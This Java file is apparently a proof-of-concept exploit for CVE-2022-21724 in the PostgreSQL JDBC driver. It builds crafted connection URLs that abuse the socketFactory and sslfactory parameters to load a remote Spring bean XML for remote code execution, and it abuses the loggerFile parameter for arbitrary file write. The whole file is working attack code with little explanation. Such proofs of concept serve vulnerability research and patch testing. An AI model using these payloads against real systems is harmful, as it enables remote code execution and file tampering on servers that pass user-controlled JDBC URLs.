package com.github.enokiy.jdbc;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class CVE202221724 {
    public static void main(String[] args) throws SQLException {
        String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1:8888/bean.xml";

        //socketFactory/socketFactoryArg 导致RCE
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:55531/test/?socketFactory="+socketFactoryClass+ "&socketFactoryArg="+socketFactoryArg;
        Connection connection = DriverManager.getConnection(jdbcUrl);

        // sslfactory/sslfactoryarg 导致RCE    建立连接之后需要server返回一个S开头的字符串才可以触发org.postgresql.ssl.MakeSSL#convert
        String jdbcUrl1 = "jdbc:postgresql://127.0.0.1:55532/test/?user=postgres&sslfactory="+socketFactoryClass+ "&sslfactoryarg="+socketFactoryArg;

        Connection connection1 = DriverManager.getConnection(jdbcUrl1);

        //  loggerLevel/loggerFile 参数 任意文件写入

        String loggerLevel = "debug";
        String loggerFile = "test.txt";
        String shellContent="you are hacked!!";
        String jdbcUrl2 = "jdbc:postgresql://127.0.0.1:55533/test?loggerLevel="+loggerLevel+"&loggerFile="+loggerFile+ "&"+shellContent;
        Connection connection2 = DriverManager.getConnection(jdbcUrl2);
    }
}
